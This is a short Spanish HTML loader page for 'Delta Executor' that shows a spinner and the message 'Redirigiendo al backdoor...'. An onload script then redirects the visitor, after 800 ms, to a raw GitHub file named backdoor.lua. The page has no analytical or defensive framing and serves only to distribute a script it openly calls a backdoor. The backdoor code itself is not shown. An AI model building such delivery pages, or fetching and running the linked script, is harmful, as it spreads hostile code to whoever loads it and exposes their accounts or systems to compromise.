<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando Script Delta Executor...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
            color: white;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            border: 1px solid #00ff88;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
            max-width: 500px;
        }
        h1 {
            color: #00ff88;
            margin-bottom: 20px;
        }
        p {
            color: #cccccc;
            margin-bottom: 30px;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #00ff88;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #00ff88;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Delta Executor</h1>
        <div class="loader"></div>
        <p>Redirigiendo al backdoor...</p>
        <p class="status">Cargando script...</p>
    </div>

    <script>
        // Redirección inmediata al raw script
        window.onload = function() {
            setTimeout(() => {
                window.location.href = "https://raw.githubusercontent.com/deltaexecutor1222/backdoor/master/backdoor.lua";
            }, 800);
        };
    </script>
</body>
</html>
